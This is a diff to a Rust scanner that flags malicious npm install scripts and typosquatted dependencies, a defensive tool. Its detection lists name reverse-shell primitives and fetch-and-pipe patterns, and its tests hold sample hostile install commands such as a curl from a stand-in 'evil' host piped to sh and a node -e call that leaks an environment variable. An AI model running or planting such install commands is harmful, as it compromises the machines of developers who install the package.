@@ -69,16 +69,47 @@ const POPULAR_PACKAGES: &[&str] = &[
     "fastify",
     "hapi",
     "nest",
-];
-
-/// Shell-related tokens that are suspicious inside install scripts.
-const SUSPICIOUS_COMMANDS: &[&str] = &[
-    "curl", "wget", "bash", "node", "eval", "base64", "sh ", "sh\t", "/bin/sh", "/bin/bash",
-    "powershell", "cmd.exe", "nc ", "netcat", "python", "ruby", "perl",
+    // expanded top-downloads set for typosquat-at-scale
+    "async", "bluebird", "rxjs", "yargs", "minimist", "glob", "rimraf", "mkdirp",
+    "uuid", "nanoid", "semver", "ms", "qs", "ws", "got", "node-sass", "sass",
+    "postcss", "autoprefixer", "tailwindcss", "bootstrap", "styled-components",
+    "classnames", "immer", "redux", "react-redux", "react-router", "react-dom",
+    "react-router-dom", "zustand", "formik", "yup", "zod", "joi", "ajv",
+    "validator", "moment-timezone", "dayjs", "date-fns", "luxon", "chokidar",
+    "nodemon", "concurrently", "cross-env", "dotenv-expand", "node-fetch",
+    "isomorphic-fetch", "superagent", "undici", "cheerio", "puppeteer",
+    "playwright", "jsdom", "ejs", "pug", "handlebars", "mustache", "marked",
+    "highlight.js", "prismjs", "lodash.merge", "lodash.get", "ramda",
+    "core-js", "regenerator-runtime", "tslib", "babel-core", "babel-loader",
+    "ts-node", "ts-loader", "ts-jest", "esbuild", "terser", "uglify-js",
+    "html-webpack-plugin", "css-loader", "style-loader", "file-loader",
+    "mini-css-extract-plugin", "webpack-cli", "webpack-dev-server", "vite",
+    "vitest", "cypress", "playwright-core", "supertest", "sinon", "chai",
+    "enzyme", "testing-library", "nock", "msw", "faker", "chance",
+    "express-session", "cookie-parser", "multer", "compression", "serve-static",
+    "http-proxy-middleware", "socket.io-client", "ioredis", "mongodb", "mysql2",
+    "sqlite3", "knex", "typeorm", "prisma", "nodemailer", "stripe", "twilio",
+    "googleapis", "openai", "node-cron", "bull", "amqplib", "kafkajs",
+    "log4js", "pino", "signale", "ora", "inquirer", "prompts", "boxen",
+    "figlet", "cli-table3", "progress", "listr", "execa", "shelljs",
+    "cross-spawn", "fs-extra", "graceful-fs", "del", "globby", "fast-glob",
+    "chokidar-cli", "concurrently", "npm-run-all", "rollup", "snowpack",
+    "tedious", "sharp", "jimp", "canvas", "pdfkit", "archiver", "adm-zip",
+    "jszip", "tar", "node-forge", "crypto-js", "bcryptjs", "argon2",
+    "jose", "passport-jwt", "express-validator", "helmet", "rate-limiter-flexible",
 ];
 
 /// Install-lifecycle script keys that are commonly abused.
 const INSTALL_SCRIPT_KEYS: &[&str] = &["preinstall", "install", "postinstall", "prepare", "preuninstall"];
+
+/// Well-known benign native-build / tooling invocations. Install scripts that
+/// consist of these are normal for thousands of legitimate packages and must
+/// NOT be flagged on their own (only if they ALSO contain a malicious signal).
+const BENIGN_INSTALL_TOOLS: &[&str] = &[
+    "node-gyp", "prebuild-install", "node-pre-gyp", "prebuildify", "prebuild",
+    "cmake-js", "neon", "napi", "tsc", "husky", "patch-package", "is-ci",
+    "opencollective", "node-gyp-build", "install-app-deps", "electron-builder",
+];
 
 /// Analyze a package.json file at the given path and return all findings.
 ///
@@ -127,6 +158,76 @@ pub fn analyze_contents(
 // Rule 1: Suspicious install scripts
 // ---------------------------------------------------------------------------
 
+/// Classification of an install-script command, most-severe first.
+enum InstallVerdict {
+    /// Downloads a remote resource and pipes/chains it into a shell.
+    DownloadExecute(&'static str),
+    /// Runs inline code via an interpreter eval flag (node -e, python -c, ...).
+    InlineExec(&'static str),
+    /// Contains obfuscated/encoded content (base64 blob, \x, fromCharCode).
+    Obfuscated(&'static str),
+    /// References a raw network URL during install (no clear download-exec).
+    Network,
+    /// Uses a raw shell/reverse-shell primitive.
+    Shell(&'static str),
+    /// Nothing suspicious.
+    Clean,
+}
+
+/// Classify an install command. Benign native-build tooling (node-gyp etc.) is
+/// only cleared when it carries NO malicious signal — `node-gyp rebuild && curl
+/// evil | sh` is still caught because the download-execute check runs first.
+fn classify_install_command(cmd: &str) -> InstallVerdict {
+    let lower = cmd.to_ascii_lowercase();
+
+    // 1. Download-and-execute: a fetcher combined with a shell pipe/chain or a
+    //    URL. This is the canonical malicious-install pattern.
+    let has_fetcher = ["curl ", "wget ", "fetch ", "invoke-webrequest", "iwr ", "certutil"]
+        .iter()
+        .any(|t| lower.contains(t));
+    let pipes_to_shell = ["| sh", "|sh", "| bash", "|bash", "| node", "|node", "; sh", "&& sh", "&&sh"]
+        .iter()
+        .any(|t| lower.contains(t));
+    if has_fetcher && (pipes_to_shell || lower.contains("http")) {
+        return InstallVerdict::DownloadExecute("remote download piped into a shell");
+    }
+    if has_fetcher {
+        return InstallVerdict::DownloadExecute("network fetch during install");
+    }
+
+    // 2. Inline code execution via interpreter eval flags.
+    for flag in ["node -e", "node --eval", "node -p", "node --print", "python -c", "python3 -c", "ruby -e", "perl -e", "deno eval", "-encodedcommand", "powershell -e", "powershell -enc"] {
+        if lower.contains(flag) {
+            return InstallVerdict::InlineExec("inline code execution flag");
+        }
+    }
+
+    // 3. Obfuscation / encoding inside the command.
+    if lower.contains("base64 -d") || lower.contains("base64 --decode") || lower.contains("atob(")
+        || lower.contains("fromcharcode") || cmd.contains("\\x") || cmd.contains("\\u00")
+        || lower.contains("eval(")
+    {
+        return InstallVerdict::Obfuscated("encoded/eval payload in install script");
+    }
+
+    // From here on, a benign build-tool invocation with no further signal is OK.
+    let is_benign_tool = BENIGN_INSTALL_TOOLS.iter().any(|t| lower.contains(t));
+
+    // 4. Raw shell / reverse-shell primitives.
+    for prim in ["/dev/tcp", "bash -i", "sh -i", "nc -e", "ncat -e", "bash -c", "sh -c", "/bin/sh", "/bin/bash", "cmd.exe", "netcat", "mkfifo"] {
+        if lower.contains(prim) {
+            return InstallVerdict::Shell("raw shell primitive");
+        }
+    }
+
+    // 5. Network URL during install (informational unless build tool).
+    if !is_benign_tool && (lower.contains("http://") || lower.contains("https://")) {
+        return InstallVerdict::Network;
+    }
+
+    InstallVerdict::Clean
+}
+
 fn check_install_scripts(
     obj: &serde_json::Map<String, Value>,
     file: &str,
@@ -139,25 +240,51 @@ fn check_install_scripts(
 
     for &key in INSTALL_SCRIPT_KEYS {
         if let Some(Value::String(cmd)) = scripts.get(key) {
-            let lower = cmd.to_ascii_lowercase();
-            for &token in SUSPICIOUS_COMMANDS {
-                if lower.contains(token) {
-                    findings.push(ManifestFinding {
-                        rule_id: "MANIFEST-001".to_string(),
-                        name: "Suspicious install script".to_string(),
-                        description: format!(
-                            "The \"{key}\" script contains a suspicious command \
-                             (\"{token}\") that may indicate a supply chain attack.",
-                        ),
-                        severity: "critical".to_string(),
-                        file: file.to_string(),
-                        detail: format!("{key}: {cmd}"),
-                    });
-                    // One finding per script key is enough — avoid duplicating
-                    // for every token that matches inside the same command.
-                    break;
-                }
-            }
+            let (rule_id, name, severity, why) = match classify_install_command(cmd) {
+                InstallVerdict::DownloadExecute(w) => (
+                    "MANIFEST-001",
+                    "Malicious install script",
+                    "critical",
+                    w,
+                ),
+                InstallVerdict::InlineExec(w) => (
+                    "MANIFEST-001",
+                    "Malicious install script",
+                    "critical",
+                    w,
+                ),
+                InstallVerdict::Obfuscated(w) => (
+                    "MANIFEST-005",
+                    "Obfuscated install script",
+                    "critical",
+                    w,
+                ),
+                InstallVerdict::Shell(w) => (
+                    "MANIFEST-001",
+                    "Malicious install script",
+                    "critical",
+                    w,
+                ),
+                InstallVerdict::Network => (
+                    "MANIFEST-006",
+                    "Install script makes network request",
+                    "high",
+                    "references a remote URL during install",
+                ),
+                InstallVerdict::Clean => continue,
+            };
+            findings.push(ManifestFinding {
+                rule_id: rule_id.to_string(),
+                name: name.to_string(),
+                description: format!(
+                    "The \"{key}\" lifecycle script {why}. Install-time scripts run \
+                     automatically on `npm install` and are the most common supply \
+                     chain attack vector.",
+                ),
+                severity: severity.to_string(),
+                file: file.to_string(),
+                detail: format!("{key}: {cmd}"),
+            });
         }
     }
 }
@@ -257,6 +384,16 @@ fn levenshtein(a: &str, b: &str) -> usize {
     prev[b_len]
 }
 
+/// Normalize a package name by removing separators so that separator-swap
+/// typosquats ("lo-dash", "node_fetch", "cross.spawn") collapse onto the real
+/// name. Lowercased; `.`, `-`, `_` stripped.
+fn normalize_name(name: &str) -> String {
+    name.chars()
+        .filter(|c| *c != '-' && *c != '_' && *c != '.')
+        .flat_map(|c| c.to_lowercase())
+        .collect()
+}
+
 /// Maximum edit distance for a pair to be considered a potential typosquat.
 fn typosquat_threshold(popular_name: &str, dep_name: &str) -> usize {
     let min_len = popular_name.len().min(dep_name.len());
@@ -287,6 +424,28 @@ fn check_typosquats(
 
         // Skip exact matches — those are the real packages.
         if POPULAR_PACKAGES.contains(&bare) {
+            continue;
+        }
+
+        // Separator/punctuation trick: "lo-dash", "node_fetch", "cross.spawn"
+        // normalize to a popular name while not matching it exactly.
+        let norm_bare = normalize_name(bare);
+        if let Some(popular) = POPULAR_PACKAGES
+            .iter()
+            .copied()
+            .find(|p| normalize_name(p) == norm_bare && *p != bare)
+        {
+            findings.push(ManifestFinding {
+                rule_id: "MANIFEST-002".to_string(),
+                name: "Potential typosquat dependency".to_string(),
+                description: format!(
+                    "Dependency \"{dep}\" matches the popular package \"{popular}\" \
+                     after normalizing separators — a common typosquat technique.",
+                ),
+                severity: "high".to_string(),
+                file: file.to_string(),
+                detail: format!("{dep} ~ {popular} (separator trick)"),
+            });
             continue;
         }
 
@@ -488,6 +647,50 @@ mod tests {
         assert!(!findings.is_empty());
         assert_eq!(findings[0].rule_id, "MANIFEST-001");
         assert_eq!(findings[0].severity, "critical");
+    }
+
+    #[test]
+    fn ignores_node_gyp_rebuild() {
+        // node-gyp / native build tooling is used by thousands of legit packages.
+        for cmd in ["node-gyp rebuild", "prebuild-install || node-gyp rebuild", "node scripts/build.js", "tsc -p .", "husky install"] {
+            let pkg = format!(r#"{{"name":"x","scripts":{{"postinstall":"{cmd}"}}}}"#);
+            let findings = analyze_contents(&pkg, "package.json").unwrap();
+            assert!(
+                findings.iter().all(|f| !f.rule_id.starts_with("MANIFEST-00") || (f.rule_id != "MANIFEST-001" && f.rule_id != "MANIFEST-005" && f.rule_id != "MANIFEST-006")),
+                "benign build tool '{cmd}' should not be flagged, got: {:?}",
+                findings
+            );
+        }
+    }
+
+    #[test]
+    fn detects_download_execute_install() {
+        let pkg = r#"{"name":"x","scripts":{"preinstall":"curl https://evil.tld/p.sh | sh"}}"#;
+        let f = analyze_contents(pkg, "package.json").unwrap();
+        let m = f.iter().find(|x| x.rule_id == "MANIFEST-001").expect("download-exec");
+        assert_eq!(m.severity, "critical");
+    }
+
+    #[test]
+    fn detects_inline_node_eval_install() {
+        let pkg = r#"{"name":"x","scripts":{"postinstall":"node -e \"require('http').get(process.env.X)\""}}"#;
+        let f = analyze_contents(pkg, "package.json").unwrap();
+        assert!(f.iter().any(|x| x.rule_id == "MANIFEST-001" && x.severity == "critical"));
+    }
+
+    #[test]
+    fn detects_obfuscated_install() {
+        let pkg = r#"{"name":"x","scripts":{"postinstall":"echo aGVsbG8= | base64 -d | sh"}}"#;
+        let f = analyze_contents(pkg, "package.json").unwrap();
+        assert!(f.iter().any(|x| x.rule_id == "MANIFEST-005" || x.rule_id == "MANIFEST-001"));
+    }
+
+    #[test]
+    fn detects_separator_typosquat() {
+        let pkg = r#"{"name":"app","dependencies":{"lo-dash":"^1.0.0","cross_env":"^1.0.0"}}"#;
+        let f = analyze_contents(pkg, "package.json").unwrap();
+        let typos: Vec<_> = f.iter().filter(|x| x.rule_id == "MANIFEST-002").collect();
+        assert!(typos.iter().any(|x| x.detail.contains("lodash")), "lo-dash should map to lodash");
     }
 
     #[test]
